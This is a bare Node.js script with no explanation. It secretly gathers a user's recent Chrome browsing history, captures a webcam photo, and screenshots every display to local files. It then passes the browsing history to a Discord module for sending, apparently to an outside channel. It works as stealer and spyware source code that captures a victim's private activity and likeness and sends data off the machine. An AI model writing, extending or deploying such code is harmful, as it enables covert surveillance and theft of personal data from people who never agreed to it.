const dotenv = require("dotenv").config()
const BrowserHistory = require("node-browser-history");
const screenshot = require("screenshot-desktop");
const NodeWebcam = require("node-webcam");
const fs = require("fs");
const Discord = require("./discord").discord;

var opts = {
  width: 1280,
  height: 720,
  quality: 100,
  frames: 60,
  delay: 0,
  saveShots: true,
  output: "jpeg",
  device: false,
  callbackReturn: "location",
  verbose: false,
};


Promise.all([
    new Promise((resolve, reject) => {
        BrowserHistory.getChromeHistory(10).then(function (history) {
            console.log(history)
            resolve(history)
        });
    }),
    new Promise((resolve, reject) => {
        var Webcam = NodeWebcam.create(opts);
        Webcam.capture("webcam", function (err, data) {
            if ( !err ) resolve();
            else reject;
        });
    }),
    new Promise((resolve, reject) => {
        screenshot.all().then((imgs) => {
            proms = [];
            imgs.forEach((img, i) => {
                proms.push(new Promise((resolve, reject) => {
                    fs.writeFile(`ss-${i}.jpg`, img, function () {
                        console.log("wrote ", i);
                        resolve()
                    });
                }))
            });
            Promise.all(proms).then(resolve).catch(reject);
        });
    })
]).then(res => {
    console.log("GOT ALL INFO")
    Discord.sendLog(res[0][0])
})